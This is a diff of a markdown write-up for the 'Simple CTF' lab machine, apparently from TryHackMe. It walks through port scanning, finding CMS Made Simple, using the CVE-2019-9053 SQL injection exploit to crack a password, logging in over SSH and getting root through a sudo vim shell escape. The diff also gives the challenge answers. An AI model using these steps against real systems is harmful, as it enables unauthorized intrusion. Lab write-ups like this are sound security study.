@@ -74,58 +74,76 @@ local: ForMitch.txt remote: ForMitch.txt
 ftp> exit
 221 Goodbye.
 ```
-
-1. What is running on the higher port?
-2. What's the CVE you're using against the application?
-3. To what kind of vulnerability is the application vulnerable?
-Hint : You can use /usr/share/seclists/Passwords/Common-Credentials/best110.txt to crack the pass 
-5. What's the password?
-6. Where can you login with the details obtained?
-7. What's the user flag?
-8. Is there any other user in the home directory? What's its name?
-9. What can you leverage to spawn a privileged shell?
-10. What's the root flag?
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-ftp login
-
-```text
-┌─[visith@parrot]─[~/CTF/thm/simple-ctf]
-└──╼ $cat ForMitch.txt 
-Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
-
-
+we got some clue take a look into it.
 ```
+Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+```
+Other port was a 80 when we go into that port we can view default apache page. Let's move to our next question.
 
-sql injection
+## What is running on the higher port?
+```
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+According to the nmap result it was a  **SSH**.
+
+## What's the CVE you're using against the application?
+I tried to bruteforce the webpage and look into the hidden web directories.
+
+```bash
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+OUTPUT_FILE: result.txt
+START_TIME: Sat Jun  5 18:45:13 2021
+URL_BASE: http://10.10.225.250/
+WORDLIST_FILES: /opt/seclist/Discovery/Web-Content/raft-medium-directories.txt
+OPTION: Not Recursive
+
+-----------------
+
+GENERATED WORDS: 29984
+
+---- Scanning URL: http://10.10.225.250/ ----
+==> DIRECTORY: http://10.10.225.250/simple/
++ http://10.10.225.250/server-status (CODE:403|SIZE:301)
+```
+I think we got a hit. When we go look into the **http://10.10.225.250/simple/** you can see another webpage. End of that web page I found this.
+
+![](Images/version.png)
+
+This site made by **CMS made simple** . Let's search about it on searchsploit we found a one CVE matching to our version. https://www.exploit-db.com/exploits/46635
+
 ```bash
 CMS Made Simple < 2.2.10 - SQL Injection                                               | php/webapps/46635.py
 ```
+Our answer is a CVE-Number. Let's look what is the CVE number.
+```python
+#!/usr/bin/env python
+# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
+# Date: 30-03-2019
+# Exploit Author: Daniele Scanu @ Certimeter Group
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
+# Version: <= 2.2.9
+# Tested on: Ubuntu 18.04 LTS
+# CVE : CVE-2019-9053
+```
+## To what kind of vulnerability is the application vulnerable?
+( Hint : You can use /usr/share/seclists/Passwords/Common-Credentials/best110.txt to crack the pass ) 
+
+It's a **sql injection**. Answer must be **sqli**.
+
+## What's the password?
+Let's run our script. Before I turn that script to python3. Take a look into the my exploit.py
+
+Now we can exploit our script. For that you can simply use command like this :
 
 ```bash
 ┌─[✗]─[visith@parrot]─[~/CTF/thm/simple-ctf]
@@ -137,6 +155,12 @@ CMS Made Simple < 2.2.10 - SQL Injection                                        
 [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
 [+] Password cracked: secret
 ```
+
+## Where can you login with the details obtained?
+
+Our ForMitch.txt give us a clue. we can log into the mitch user via **SSH**.
+
+## What's the user flag?
 
 ```bash
 ─[✗]─[visith@parrot]─[~/CTF/thm/simple-ctf]
@@ -160,26 +184,29 @@ $ /usr/bin/script -qc /bin/bash /dev/null
 mitch@Machine:~$ ls
 user.txt
 mitch@Machine:~$ cat user.txt 
-G00d j0b, keep up!
+```
+## Is there any other user in the home directory? What's its name?
+
+```bash
 mitch@Machine:~$ cd /home
 mitch@Machine:/home$ ls
 mitch  sunbath
 ```
+**sunbath** is other directory.
 
+## What can you leverage to spawn a privileged shell?
 
 ```bash
 mitch@Machine:/dev/shm$ sudo -l
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
-
-
 ```
+Seems like **vim**, we found our way into the root.
+
+##  What's the root flag?
+We can use this command to execute the vim as a root and get a shell as a root.
 ```bash
 root@Machine:/dev/shm# sudo /usr/bin/vim -c ':!/bin/sh'
-
-# ^[[2;2R^[]11;rgb:0000/0000/0000^Gls
-/bin/sh: 1: ot found
-/bin/sh: 1: 2Rls: not found
 # id
 uid=0(root) gid=0(root) groups=0(root)
 # ls
@@ -192,5 +219,33 @@ user.txt
 # ls
 root.txt
 # cat root.txt
-W3ll d0n3. You made it!
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
